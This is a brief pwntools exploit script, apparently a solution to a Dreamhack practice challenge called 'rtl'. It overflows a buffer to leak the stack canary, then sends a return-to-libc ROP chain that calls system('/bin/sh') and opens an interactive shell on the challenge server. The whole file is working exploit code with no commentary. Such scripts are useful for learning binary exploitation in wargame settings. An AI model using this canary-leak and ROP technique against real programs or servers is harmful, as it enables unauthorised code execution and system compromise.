from pwn import *

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 23148)
e = ELF('./rtl')

payload = b'A' * 0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))
pop = 0x400853
system_plt = e.plt['system']
binsh = 0x400874
ret = 0x400285

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8 + p64(ret)
payload += p64(pop) + p64(binsh) + p64(system_plt)

p.sendafter(b'Buf: ', payload)
p.interactive()